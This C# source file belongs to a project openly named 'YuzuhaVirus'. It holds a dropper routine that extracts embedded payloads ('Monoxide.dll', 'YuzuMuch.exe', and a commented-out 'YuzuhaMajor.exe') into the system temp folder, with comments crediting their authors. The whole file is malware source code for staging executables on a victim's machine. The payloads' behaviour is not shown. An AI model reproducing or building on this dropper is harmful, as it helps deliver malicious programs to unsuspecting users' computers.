using System;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using static YuzuhaVirus.Functions;


namespace YuzuhaVirus
{
    public static class Extract
    {
        public static void DLL_Extract()
        {
            Extract( "YuzuhaVirus", Path.GetTempPath(), "DLL", "Monoxide.dll" );
            // Monoxide dll by Mist
        }
        public static void EXE_Extract()
        {
            Extract( "YuzuhaVirus", Path.GetTempPath(), "EXE", "YuzuMuch.exe" );
            // YuzuMuch.exe by Mist


            /*
            Extract( "YuzuhaVirus", Path.GetTempPath(), "EXE", "YuzuhaMajor.exe" );
            //YuzuhaMajor by YukkuriButti
            */
        }
    }
}
